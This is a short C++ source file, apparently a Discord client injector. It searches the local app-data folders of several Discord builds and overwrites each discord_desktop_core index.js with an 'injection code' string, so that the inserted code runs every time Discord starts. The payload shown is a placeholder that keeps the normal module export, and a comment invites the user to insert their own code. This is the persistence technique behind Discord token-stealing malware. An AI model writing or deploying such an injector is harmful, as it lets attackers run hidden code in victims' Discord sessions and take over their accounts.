#include <iostream>;
#include <fstream>;

#include <filesystem>;
#include <vector>;

std::string injection_code = "module.exports = require('./core.asar');"; // insert injection code here NOTE: make sure to keep the module.export part since thats what discord uses to run the dekstop core client
std::vector<std::string> dir_names_node = {"Discord", "DiscordCanary", "DiscordPTB", "DiscordDevelopment"}; // supports most discord application TODO: BetterDiscord (Idk if it works on it)

std::string get_local_app_data() { // grab local app data return it as a string to use it in fs
    const char* app_data = std::getenv("LOCALAPPDATA");
    if (app_data == nullptr) {
        return "";
    };

    return std::string(app_data);
};

void edit_discord_file(const std::string& dir_name) { // this function goes through the app data folder while looking through the directory you give it for the index.js file to inject the given code in it
    std::filesystem::path file_path = std::filesystem::path(get_local_app_data()) / dir_name;

    if (!std::filesystem::is_directory(file_path)) {
        return;
    };
    for (const auto& entry : std::filesystem::recursive_directory_iterator(file_path)) {
        if (entry.is_regular_file() && entry.path().filename() == "index.js") {
            std::string file_path = entry.path().string();
            if (std::filesystem::path(file_path).parent_path().filename() == "discord_desktop_core") {
                std::ofstream file(file_path, std::ios::out | std::ios::trunc);
                if (file.is_open()) {
                    file << injection_code;
                    file.close();
                };
            };
        };
    };
    return ;
}

int main() {
    for (const std::string dir_name: dir_names_node) { // self explanotory loop for all the Discord types NOTE: the index.js file will only run every time discord opens.
        edit_discord_file(dir_name);
    };
    return 0;
};
